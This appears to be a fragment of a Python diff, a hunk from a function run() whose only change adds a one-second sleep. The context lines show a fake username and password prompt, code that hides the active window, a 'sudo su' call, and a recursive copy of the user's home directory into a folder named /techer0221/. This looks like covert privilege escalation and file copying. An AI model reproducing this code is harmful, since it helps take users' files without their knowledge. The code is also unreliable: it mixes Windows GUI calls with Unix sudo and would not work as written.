@@ -118,6 +118,7 @@ def run():
             else:
                 print(f'usename: {namesystem}')
                 print('password: ')
+                time.sleep(1)
                 win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                 os.system('sudo su')
                 os.system('cp -r /home/'+namesystem+'/* /techer0221/')
